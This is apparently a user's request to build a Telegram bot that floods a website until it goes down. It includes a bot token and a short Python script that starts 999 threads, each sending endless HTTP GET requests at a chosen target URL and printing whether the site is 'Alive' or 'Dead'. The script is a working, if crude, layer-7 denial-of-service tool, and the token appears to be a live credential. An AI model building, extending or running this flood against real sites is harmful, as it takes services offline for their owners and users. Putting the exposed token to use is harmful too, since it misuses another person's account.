I want you to make me a ddos bot for telegram make it down a website here's the bot Token 8478793015:AAEDi-BhcfO3mV6Iik4flITLXGjrqqHKvJk import os
import threading
import requests

target_url = input("Layer 7 =")

num_requests = 999
def attack():
    while True:
        try:
            response = requests.get(target_url)
            print(f"😂Alive")
        except requests.exceptions.RequestException:
            print("💀Dead")

threads = []
for _ in range(num_requests):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
